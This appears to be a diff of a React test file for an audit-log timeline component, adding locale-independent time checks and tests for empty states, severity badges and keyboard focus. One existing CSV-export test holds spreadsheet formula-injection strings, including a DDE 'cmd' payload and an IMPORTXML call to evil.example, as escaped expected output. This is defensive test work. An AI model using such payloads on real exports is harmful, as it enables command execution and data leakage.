@@ -24,6 +24,13 @@ const baseEntries = [
   { id: '9', timestamp: '2026-07-26T10:00:00Z', event: 'API key rotated' },
 ]
 
+function formatTime(iso: string): string {
+  return new Date(iso).toLocaleTimeString('en-US', {
+    hour: '2-digit',
+    minute: '2-digit',
+  })
+}
+
 function setup(density: 'comfortable' | 'compact' = 'comfortable') {
   mockUseDensityMode.mockReturnValue({ density, setDensity: vi.fn() })
 }
@@ -51,8 +58,8 @@ describe('AuditLogTimeline', () => {
 
     it('renders timestamps for each entry', () => {
       render(<AuditLogTimeline entries={baseEntries} />)
-      expect(screen.getByText('08:12 AM')).toBeInTheDocument()
-      expect(screen.getByText('09:00 AM')).toBeInTheDocument()
+      expect(screen.getByText(formatTime('2026-07-28T08:12:00Z'))).toBeInTheDocument()
+      expect(screen.getByText(formatTime('2026-07-28T09:00:00Z'))).toBeInTheDocument()
     })
 
     it('renders details when provided', () => {
@@ -124,7 +131,11 @@ describe('AuditLogTimeline', () => {
 
     it('shows time range for burst groups', () => {
       render(<AuditLogTimeline entries={baseEntries} />)
-      expect(screen.getByText('08:12 AM \u2013 08:15 AM')).toBeInTheDocument()
+      expect(
+        screen.getByText(
+          `${formatTime('2026-07-28T08:12:00Z')} \u2013 ${formatTime('2026-07-28T08:15:00Z')}`,
+        ),
+      ).toBeInTheDocument()
     })
 
     it('shows individual entries alongside burst groups', () => {
@@ -521,5 +532,188 @@ describe('CSV export of filtered audit log', () => {
       'inj-1,2026-07-28T10:00:00Z,critical,"\'=cmd|""/c calc""!A0","\'+SUM(1,2)"',
       'inj-2,2026-07-28T10:01:00Z,warn,\'-2+3,"\'@IMPORTXML(""http://evil.example"",""//a"")"',
     ])
+  })
+})
+
+describe('empty list rendering', () => {
+  it('renders polite status region without log container when entries list is empty in comfortable mode', () => {
+    setup('comfortable')
+    render(<AuditLogTimeline entries={[]} />)
+
+    const status = screen.getByRole('status')
+    expect(status).toHaveAttribute('aria-live', 'polite')
+    expect(status).toHaveTextContent('No audit log entries.')
+    expect(screen.queryByRole('log')).not.toBeInTheDocument()
+    expect(screen.queryByRole('list')).not.toBeInTheDocument()
+    expect(screen.queryByRole('listitem')).not.toBeInTheDocument()
+    expect(screen.queryByLabelText(/Toggle severity legend/i)).not.toBeInTheDocument()
+  })
+
+  it('renders polite status region without log container when entries list is empty in compact mode', () => {
+    setup('compact')
+    render(<AuditLogTimeline entries={[]} />)
+
+    const status = screen.getByRole('status')
+    expect(status).toHaveAttribute('aria-live', 'polite')
+    expect(status).toHaveTextContent('No audit log entries.')
+    expect(screen.queryByRole('log')).not.toBeInTheDocument()
+    expect(screen.queryByRole('list')).not.toBeInTheDocument()
+    expect(screen.queryByRole('listitem')).not.toBeInTheDocument()
+    expect(screen.queryByLabelText(/Toggle severity legend/i)).not.toBeInTheDocument()
+  })
+})
+
+describe('severity badge rendering', () => {
+  it('renders severity badge with correct label, icon, and colors for all levels', () => {
+    setup('comfortable')
+    render(<AuditLogTimeline entries={severityEntries} />)
+
+    const badges = screen.getAllByLabelText(/^Severity: /)
+    expect(badges).toHaveLength(4)
+
+    // Info badge
+    const infoBadge = screen.getByLabelText('Severity: Info')
+    expect(infoBadge).toHaveTextContent('ℹ️')
+    expect(infoBadge).toHaveTextContent('Info')
+    expect(infoBadge).toHaveStyle({ color: '#60a5fa' })
+
+    // Warning badge
+    const warnBadge = screen.getByLabelText('Severity: Warning')
+    expect(warnBadge).toHaveTextContent('⚠️')
+    expect(warnBadge).toHaveTextContent('Warning')
+    expect(warnBadge).toHaveStyle({ color: '#fb923c' })
+
+    // Error badge
+    const errorBadge = screen.getByLabelText('Severity: Error')
+    expect(errorBadge).toHaveTextContent('❌')
+    expect(errorBadge).toHaveTextContent('Error')
+    expect(errorBadge).toHaveStyle({ color: '#f87171' })
+
+    // Critical badge
+    const criticalBadge = screen.getByLabelText('Severity: Critical')
+    expect(criticalBadge).toHaveTextContent('🚨')
+    expect(criticalBadge).toHaveTextContent('Critical')
+    expect(criticalBadge).toHaveStyle({ color: '#c084fc' })
+  })
+
+  it('renders severity badges inside interactive event buttons in compact mode', () => {
+    setup('compact')
+    render(<AuditLogTimeline entries={severityEntries} />)
+
+    for (const entry of severityEntries) {
+      const button = screen.getByLabelText(new RegExp(`View details for ${entry.event}`))
+      expect(button).toBeInTheDocument()
+      const chip = within(button).getByLabelText(new RegExp(`^Severity: `))
+      expect(chip).toBeInTheDocument()
+    }
+  })
+
+  it('does not render severity badge when severity is undefined', () => {
+    setup('comfortable')
+    const noSeverity = [
+      { id: '1', timestamp: '2026-07-28T08:12:00Z', event: 'Key generated' },
+    ]
+    render(<AuditLogTimeline entries={noSeverity} />)
+
+    expect(screen.queryByLabelText(/^Severity: /)).not.toBeInTheDocument()
+  })
+})
+
+describe('arrow-key focus movement between events', () => {
+  it('moves focus forward and backward using ArrowDown and ArrowUp in compact density', () => {
+    setup('compact')
+    render(<AuditLogTimeline entries={severityEntries} />)
+
+    const buttons = screen.getAllByRole('button', { name: /^View details for/ })
+    expect(buttons).toHaveLength(4)
+
+    buttons[0].focus()
+    expect(document.activeElement).toBe(buttons[0])
+
+    fireEvent.keyDown(buttons[0], { key: 'ArrowDown' })
+    expect(document.activeElement).toBe(buttons[1])
+
+    fireEvent.keyDown(buttons[1], { key: 'ArrowDown' })
+    expect(document.activeElement).toBe(buttons[2])
+
+    fireEvent.keyDown(buttons[2], { key: 'ArrowUp' })
+    expect(document.activeElement).toBe(buttons[1])
+
+    fireEvent.keyDown(buttons[1], { key: 'ArrowUp' })
+    expect(document.activeElement).toBe(buttons[0])
+  })
+
+  it('wraps focus around on boundary navigation (ArrowUp on first and ArrowDown on last)', () => {
+    setup('compact')
+    render(<AuditLogTimeline entries={severityEntries} />)
+
+    const buttons = screen.getAllByRole('button', { name: /^View details for/ })
+
+    buttons[0].focus()
+    fireEvent.keyDown(buttons[0], { key: 'ArrowUp' })
+    expect(document.activeElement).toBe(buttons[buttons.length - 1])
+
+    fireEvent.keyDown(buttons[buttons.length - 1], { key: 'ArrowDown' })
+    expect(document.activeElement).toBe(buttons[0])
+  })
+
+  it('navigates with Home and End keys', () => {
+    setup('compact')
+    render(<AuditLogTimeline entries={severityEntries} />)
+
+    const buttons = screen.getAllByRole('button', { name: /^View details for/ })
+
+    buttons[1].focus()
+    fireEvent.keyDown(buttons[1], { key: 'End' })
+    expect(document.activeElement).toBe(buttons[buttons.length - 1])
+
+    fireEvent.keyDown(buttons[buttons.length - 1], { key: 'Home' })
+    expect(document.activeElement).toBe(buttons[0])
+  })
+
+  it('navigates across day groups in compact density', () => {
+    setup('compact')
+    const multiDayEntries: AuditLogEntry[] = [
+      { id: 'd1-1', timestamp: '2026-07-28T08:12:00Z', event: 'Day 1 Event A' },
+      { id: 'd1-2', timestamp: '2026-07-28T08:15:00Z', event: 'Day 1 Event B' },
+      { id: 'd2-1', timestamp: '2026-07-27T10:00:00Z', event: 'Day 2 Event A' },
+    ]
+    render(<AuditLogTimeline entries={multiDayEntries} />)
+
+    const buttons = screen.getAllByRole('button', { name: /^View details for/ })
+    expect(buttons).toHaveLength(3)
+
+    buttons[1].focus()
+    fireEvent.keyDown(buttons[1], { key: 'ArrowDown' })
+    expect(document.activeElement).toBe(buttons[2])
+
+    fireEvent.keyDown(buttons[2], { key: 'ArrowUp' })
+    expect(document.activeElement).toBe(buttons[1])
+  })
+
+  it('moves focus with arrow keys in comfortable density', () => {
+    setup('comfortable')
+    render(<AuditLogTimeline entries={severityEntries} />)
+
+    const buttons = screen.getAllByRole('button', { name: /^View details for/ })
+    expect(buttons).toHaveLength(4)
+
+    buttons[0].focus()
+    fireEvent.keyDown(buttons[0], { key: 'ArrowDown' })
+    expect(document.activeElement).toBe(buttons[1])
+
+    fireEvent.keyDown(buttons[1], { key: 'ArrowUp' })
+    expect(document.activeElement).toBe(buttons[0])
+  })
+
+  it('ignores unrelated key presses without moving focus', () => {
+    setup('compact')
+    render(<AuditLogTimeline entries={severityEntries} />)
+
+    const buttons = screen.getAllByRole('button', { name: /^View details for/ })
+    buttons[0].focus()
+
+    fireEvent.keyDown(buttons[0], { key: 'Tab' })
+    expect(document.activeElement).toBe(buttons[0])
   })
 })
